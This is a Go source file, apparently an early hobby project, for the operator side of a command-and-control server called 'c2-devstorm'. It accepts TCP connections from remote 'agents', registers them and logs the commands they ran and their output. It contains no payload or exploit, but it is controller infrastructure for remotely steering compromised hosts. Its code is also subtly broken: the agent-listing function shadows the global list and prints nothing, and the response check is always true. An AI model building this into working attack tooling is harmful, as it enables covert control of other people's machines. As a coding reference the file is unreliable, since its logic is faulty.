package main

// Imports
import (
	"bufio"
	"c2-devstorm/commons"
	"encoding/gob"
	"log"
	"net"
	"os"
	"strings"
)

// Global variables
var (
	agentList     = []commons.Message{}
	selectedAgent string
)

// Main function
func main() {
	log.Println("Entrei em execução.")
	go startListener("9091")

	cliHandler()
}

// Function to handle CLI
func cliHandler() {
	for {

		if selectedAgent != "" {
			print(selectedAgent + "[c2-devstorm]#")
		} else {
			print("[c2-devstorm]")

		}
		// reader := bufio.NewReader(os.Stdin)
		reader := bufio.NewReader(os.Stdin)
		completeCommand, _ := reader.ReadString('\n')
		//println(completeCommand)
		// completeCommand := "show agents"
		separeteCommand := strings.Split(strings.TrimSuffix(completeCommand, "\n"), " ")
		baseCommand := strings.TrimSpace(separeteCommand[0])

		if len(baseCommand) > 0 {
			switch baseCommand {
			case "show":
				showhandler(separeteCommand)
			case "select":
				selectHandler(separeteCommand)
			default:
				log.Println("unknown command.")
			}
		}
	}
}
func showhandler(command []string) {
	if len(command) > 1 {
		switch command[1] {
		case "agents":
			agentLists(command[1])
		default:
			log.Println("unknown command.")
		}
	} else {
		log.Println("unknown command.")

	}

}

// Function to handle select command
func selectHandler(command []string) {
	if len(command) > 1 {
		selectedAgent = command[1]
		if agentCreated(command[1]) {
			selectedAgent = command[1]

		} else {
			log.Println("Agent not found.")
			log.Println("To list agentList use: show agents.")

		}
	}
}

//func init() {
//	agentList = make([]commons.Message, 0)
//}

// Function to check if agent is already registered
func agentCreated(agentID string) (registered bool) {
	registered = false
	for _, agent := range agentList {
		if agent.AgentID == agentID {
			return true
		}
	}
	return false
}

// Function to check if message contains response
func messageContainsResponse(message *commons.Message) (contains bool) {
	contains = false
	for _, command := range message.Commands {
		if command.Response != "" || command.Response != " " || len(command.Response) > 0 {
			return true
		}
	}
	return false
}

// Function to list agents
func agentLists(agentID string) (agentList []commons.Message) {
	for _, agent := range agentList {
		log.Println(agent)
	}
	return agentList
}

// Function to open socket
func startListener(port string) {
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		log.Fatal("Erro ao iniciar o Listener", err.Error())
	} else {
		for {
			channel, err := listener.Accept()
			defer channel.Close()

			if err != nil {
				log.Println("Erro em um novo canal:", err.Error())
			} else {
				message := &commons.Message{}
				gob.NewDecoder(channel).Decode(message)
				if agentCreated(message.AgentID) {
					log.Println("Agent Message: ", message.AgentID+"\n")

					// TODO: Check if message contains response
					if messageContainsResponse(message) {
						log.Println("Mensagem contém resposta: ", message.AgentID+"\n")
						for _, command := range message.Commands {
							log.Println("Comando: ", command.Command+"\n")
							log.Println("Resposta: ", command.Response+"\n")
							//for _, agent := range agentList {
							//	if agent.AgentID == message.AgentID {
							//		agent.Commands = append(agent.Commands, command)
							//	}
							//
							//}
						}

					}
				} else {

					log.Println("Nova Conexão: \n", channel.RemoteAddr().String())
					agentList = append(agentList, *message)
				}

				gob.NewEncoder(channel).Encode(message)

			}
		}
	}
}
